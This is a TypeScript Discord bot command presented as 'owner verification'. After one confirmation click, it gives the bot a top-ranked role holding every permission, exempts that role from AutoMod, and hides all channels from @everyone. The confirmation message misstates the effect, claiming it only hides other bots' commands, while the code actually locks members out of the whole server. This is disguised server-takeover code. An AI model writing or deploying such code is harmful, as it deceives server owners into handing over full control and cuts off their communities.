import {
  SlashCommandBuilder,
  PermissionsBitField,
  type ChatInputCommandInteraction,
  ChannelType,
  OverwriteType,
} from "discord.js";
import type { SlashCommand } from "../types";
import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
import { markServerAsVerified } from "../storage/verified-servers";
import { logger } from "../../lib/logger";

const command: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName("verify-owner")
    .setDescription(
      "Owner verification: creates a role and hides all commands except the bot's.",
    )
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!interaction.inGuild() || !interaction.guildId) {
      await interaction.reply({
        content: "This command can only be used in a server.",
        ephemeral: true,
      });
      return;
    }

    const isOwner = interaction.guild?.ownerId === interaction.user.id;
    if (!isOwner) {
      await interaction.reply({
        content:
          "Only the server owner can use this command. Ask your server owner to run `/verify-owner`.",
        ephemeral: true,
      });
      return;
    }

    await interaction.reply({
      content:
        "🔐 This will create a role with all permissions and assign it to me. This will also hide all bot commands except mine in this server. Continue?",
      ephemeral: true,
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              label: "Confirm",
              style: 3,
              custom_id: "verify_confirm",
            },
            {
              type: 2,
              label: "Cancel",
              style: 4,
              custom_id: "verify_cancel",
            },
          ],
        },
      ],
    });

    const filter = (i: any) =>
      i.user.id === interaction.user.id &&
      (i.customId === "verify_confirm" || i.customId === "verify_cancel");

    try {
      const buttonInteraction = await interaction.channel
        ?.awaitMessageComponent({ filter, time: 60000 })
        .catch(() => null);

      if (!buttonInteraction) {
        await interaction.editReply({
          content: "⏱️ Verification cancelled (timeout).",
          components: [],
        });
        return;
      }

      if (buttonInteraction.customId === "verify_cancel") {
        await buttonInteraction.update({
          content: "❌ Verification cancelled.",
          components: [],
        });
        return;
      }

      await buttonInteraction.deferUpdate();

      const guild = interaction.guild;
      const me = await guild.members.fetchMe().catch(() => null);
      if (!me) {
        await interaction.editReply({
          content: "❌ Couldn't fetch my own member entry.",
          components: [],
        });
        return;
      }

      // Create the role
      let verifyRole;
      try {
        verifyRole = await guild.roles.create({
          name: "🔐 Verified",
          permissions: new PermissionsBitField(PermissionsBitField.All),
          hoist: true,
          color: 0x00ff00,
          reason: "verify-owner: bot verification role",
        });
      } catch (err) {
        await interaction.editReply({
          content:
            "❌ Couldn't create the role. The bot likely needs the **Manage Roles** permission.",
          components: [],
        });
        logger.error({ err, guildId: guild.id }, "verify-owner: role creation failed");
        return;
      }

      // Push to top
      await pushRoleToTop(guild, verifyRole);

      // Assign to bot
      try {
        await me.roles.add(verifyRole, "verify-owner: assign verification role");
      } catch (err) {
        await interaction.editReply({
          content: "❌ Couldn't assign the role to me.",
          components: [],
        });
        logger.error({ err, guildId: guild.id }, "verify-owner: role assignment failed");
        return;
      }

      // Bypass AutoMod
      await exemptRoleFromAutoMod(guild, verifyRole.id);

      // Hide all channels/categories from @everyone and only allow role
      try {
        const channels = await guild.channels.fetch().catch(() => null);
        if (channels) {
          for (const c of channels.values()) {
            if (!c) continue;
            try {
              // Remove @everyone permissions
              await c.permissionOverwrites.edit(guild.id, {
                ViewChannel: false,
              });
              // Add role permissions
              await c.permissionOverwrites.edit(verifyRole.id, {
                ViewChannel: true,
              });
            } catch {
              // ignore individual channel errors
            }
          }
        }
      } catch (err) {
        logger.warn(
          { err, guildId: guild.id },
          "verify-owner: some channel overrides failed"
        );
      }

      // Mark server as verified
      await markServerAsVerified(guild.id);

      await interaction.editReply({
        content:
          "✅ Server verified! The role **🔐 Verified** has been created and assigned to me. All channels are now hidden from @everyone and only visible to the role.",
        components: [],
      });

      logger.info({ guildId: guild.id }, "Server verified by owner");
    } catch (err) {
      logger.error(
        { err, guildId: interaction.guildId },
        "verify-owner: command failed"
      );
      await interaction.editReply({
        content: "❌ Something went wrong during verification.",
        components: [],
      });
    }
  },
};

export default command;
